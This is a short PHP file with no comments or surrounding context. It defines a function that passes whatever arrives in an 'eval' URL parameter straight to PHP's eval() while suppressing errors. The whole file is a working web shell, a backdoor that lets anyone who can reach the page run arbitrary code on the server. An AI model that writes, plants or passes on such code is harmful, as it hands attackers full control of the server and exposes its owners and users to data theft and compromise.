<?php
function xeval($code){
	@ob_start();
	@eval($code);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
}

if(isset($_GET['eval']) && ($_GET['eval'] != ""))
	$result = xeval($_GET['eval']);
?>